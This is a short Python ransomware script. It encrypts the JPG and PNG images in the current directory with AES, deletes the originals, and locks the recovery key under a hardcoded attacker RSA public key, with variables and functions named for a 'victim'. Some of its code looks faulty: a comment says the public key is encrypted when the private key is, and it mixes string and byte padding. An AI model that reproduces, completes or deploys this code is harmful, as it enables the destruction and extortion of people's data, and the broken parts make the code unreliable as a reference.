import os
import rsa
from Crypto.Cipher import AES
import random
import string
import struct

KEYSIZE=512
SERVER_PUBLIC_KEY=b'-----BEGIN RSA PUBLIC KEY-----\nMIICCgKCAgEAkggBBT102jVWmcubKxVbL2acqDcQ+77u/E6brkRC9iahdF6049C8\nku7V4SoGnxzJp2LIlBSEvBa66BnvmNybGoEpfjUDwAOsR/ZaClKV6WF/M903+Oaq\nppLS43bnr8tEiyt9MuhG7G2oEQwBgKtjFSkm0B4BC4WJSxJ9YSsfBzz83avzsm3D\nPdqCuB9Lg0zRi9HF0RCK4hu3XZBa6t7FRnU4boD68SnVgPzCk8ejOw/5g4D8AF4V\nx/AhkKpqZWiH2OG0MCy+U/kkDei42DW7id9daNKVPZaBd7yHqxkN9loT85zeaSta\n+JXm523gdY+PADD8NlGWiSXh+OC1mA/iEDREAYlH+biJDUmBWZ3ajzRhdtZVqhD+\nyFmNAEcK7T7H3zWfDCCPZI5+L+OwPJVQ20Izebi3mFGTxGV3I+vC/h2q5q8XyPFP\nHHdlwqXT8JNhSwtvXyEQxLiI/Eu6VuP7P9zv4Qe4RsMQR7Qw6gj+gyWHAAn1yNwB\n2EuUU5XN9S4q40Cf3Q01oo+oJODgDbir5/WXcHdYJOZsXgFENYtSybsMaTp4n5KJ\n5zKM3pzHy1zaB+WBocVba6dfkU7T1DCbeqS/R9PJXuRpd+NLqPSC4g1Q4usJjg00\nu8HXfQfgLpy5tFdvH3YJHl+XRX9W9MhZiiR6U9uSOkq3H3flJxc8RXsCAwEAAQ==\n-----END RSA PUBLIC KEY-----\n'

def randomString(length=16):
    letter=string.ascii_letters
    return ''.join(random.choice(letter) for i in range(length))

def AESEncrypt(password, chunksize=64*1024):
    files=os.listdir()
    encrypt_list = [file for file in files if file.endswith(('jpg','JPEG','JPG','png','PNG'))]
    for file in encrypt_list:
        iv = str.encode(randomString())
        aesEncryptor = AES.new(password, AES.MODE_CBC, iv)
        out_file = file+'.pax'
        filesize = os.path.getsize(file)
        with open(file, 'rb') as infile:
            with open(out_file, 'wb') as outfile:
                outfile.write(struct.pack('<Q', filesize))
                outfile.write(iv)
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    elif len(chunk)%16 != 0:
                        chunk += ' '*(16-len(chunk)%16)
                    outfile.write(aesEncryptor.encrypt(chunk))
        os.remove(file)

def AESEncryptEasy(password, chunksize=1024):
    files=os.listdir()
    encrypt_list = [file for file in files if file.endswith(('jpg','JPEG','JPG','png','PNG'))]
    for file in encrypt_list:
        aesEncryptor = AES.new(password)
        out_file = file+'.pax'
        with open(file, 'rb') as infile:
            with open(out_file, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) < chunksize:
                        outfile.write(chunk)
                        break
                    outfile.write(aesEncryptor.encrypt(chunk))
        os.remove(file)

def GenerateVictimRSA():
    (pub_victim, priv_victim) = rsa.newkeys(KEYSIZE)
    password = randomString()
    message = password.encode()
    crypto = rsa.encrypt(message, pub_victim)
    with open('AESpassword.pass', 'wb') as aesfile:
        aesfile.write(crypto)
    #Encrypt the public key with server public key
    s_pub = rsa.PublicKey.load_pkcs1(SERVER_PUBLIC_KEY)
    encrypted_victim_public = rsa.encrypt(priv_victim.save_pkcs1(), s_pub)
    with open('DecryptInfo.pass', 'wb') as infofile:
        infofile.write(encrypted_victim_public)
    return password

if __name__ == "__main__":
    AESpassword = GenerateVictimRSA()
    AESEncryptEasy(AESpassword)
